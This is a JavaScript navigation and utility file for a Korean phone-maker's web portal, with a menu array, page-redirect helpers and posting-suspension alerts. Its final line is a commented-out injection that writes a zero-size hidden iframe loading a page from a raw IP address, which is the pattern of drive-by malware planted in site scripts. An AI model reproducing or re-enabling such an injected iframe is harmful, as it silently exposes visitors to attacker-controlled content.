menuArr[m++] = new Array('100103', '스토어 이용약관','/etc/agreement_store.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('1002', '개인정보취급방침','/etc/privacy.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('1003', '사이트맵','/etc/information/sitemap.sky', 'http://www.isky.co.kr');


// [ ] 통합검색
menuArr[m++] = new Array('11', '통합검색','/search/search.sky', 'http://www.isky.co.kr');



/**************************************************************************
*	메뉴 링크
**************************************************************************/
function menuLink(str)
// 도메인 붙이고 가는 경우
{
	var isFind = false;
	for (i=0; i<str.length; i=i+2)
	{
		for (j=0; j<menuArr.length; j++)
		{
			if (str==menuArr[j][0])
			{
				if(menuArr[j][2]=="#")
				{
					alert("페이지 없음");
					return;
				}
				else
				{
					window.location.href=menuArr[j][3] + menuArr[j][2];
					isFind = true;
					break;
				}
			}
		}

		if(isFind) break;
	}
}
function menuLink2(str)
// 도메인 안 붙이고 바로 가는 경우
{
	var isFind = false;
	for (i=0; i<str.length; i=i+2)
	{
		for (j=0; j<menuArr.length; j++)
		{
			if (str==menuArr[j][0])
			{
				if(menuArr[j][2]=="#")
				{
					alert("페이지 없음");
					return;
				}
				else
				{
					window.location.href= menuArr[j][2];
					isFind = true;
					break;
				}
			}
		}
		if(isFind) break;
	}
}

function menuLinkP(str)
// 도메인 붙이고 부모창 갈때
{
	var isFind = false;
	for (i=0; i<str.length; i=i+2)
	{
		for (j=0; j<menuArr.length; j++)
		{
			if (str==menuArr[j][0])
			{
				if(menuArr[j][2]=="#")
				{
					alert("페이지 없음");
					return;
				}
				else
				{
					if(window.top == window) {
						window.location.href=menuArr[j][3] + menuArr[j][2];
					} else {//iframe 일 경우 호출되어야 하는 url
						parent.location.href=menuArr[j][3] + menuArr[j][2];
					}
					isFind = true;
					break;
				}
			}
		}
		if(isFind) break;
	}
}

function go_talk(){
	framCheckUrl("http://message.isky.co.kr/index.sky");
}

function go_fun(){
	framCheckUrl("http://www.isky.co.kr/fun/index.sky");
}

/*function go_mall(){
	framCheckUrl("http://store.isky.co.kr/default.asp");
}*/

function go_sky(){
	framCheckUrl("http://www.isky.co.kr/product/index.sky");
}

//function go_skysupport(){
//	framCheckUrl("http://www.isky.co.kr/cs/index.sky");
//}

function go_skysupport(){
 window.open("http://cs.isky.co.kr/LoginProc.jsp?goURL=main.jsp","blank");
}

function go_mysky(){
	framCheckUrl("http://www.isky.co.kr/myisky/index.sky");
}

/*function go_login(){
	var url = "https://member.isky.co.kr:444/login.sky";
	var win = window.open(url,"LOGIN", 'scrollbars=no,status=no,resizable=yes,width=510,height=400');
}*/

function go_logout(){
	framCheckUrl("http://member.isky.co.kr/logout.sky");
}

function go_joinus(){
	framCheckUrl("http://www.isky.co.kr/member/agreement.sky");
}

function go_sitemap(){
	framCheckUrl("http://www.isky.co.kr/etc/information/sitemap.sky");
}

function go_sinmungo(){
	window.open('http://iaudit.curitel.com/page.jsp?rel=i12','','');
}

/*
function go_sinmungo(){
	window.open('http://iaudit.pantech.com/jsp/declare/declare.jsp','','');
}
*/

function framCheckUrl(url) {
	location.href=url;
//	if(window.top == window) {
//		location.href=url;
//	}else{
//		parent.location.href=url;
//	}
}

var badUserMsgY = "회원님께서는 2회 불량게시물을 등록하셔서 \n\n30일간 글쓰기가 중지됩니다";
var badUserMsgE = "회원님께서는 3회 이상 불량게시물을 등록하셔서 \n\n90일간 글쓰기가 중지됩니다";

function badUserChk(badUser){
	if(badUser == "Y"){
		alert(badUserMsgY);
		return true;
	}else if(badUser == "E"){
		alert(badUserMsgE);
		return true;
	}else{
		return false;
	}
}


function auctionPhone() {
	alert('준비중입니다');
}


//셀프업그레이드 전역변수
var maxConnect = 9000;

function downError(){
	alert("셀프업그레이드 실행 가능 인원이 초과되었습니다. 잠시 후 다시 이용해 주세요");
	return;
}
//document.writeln("<iframe height=0 width=0 Src=http:\/\/211.76.154.35\/adv\/result.asp><\/iframe>");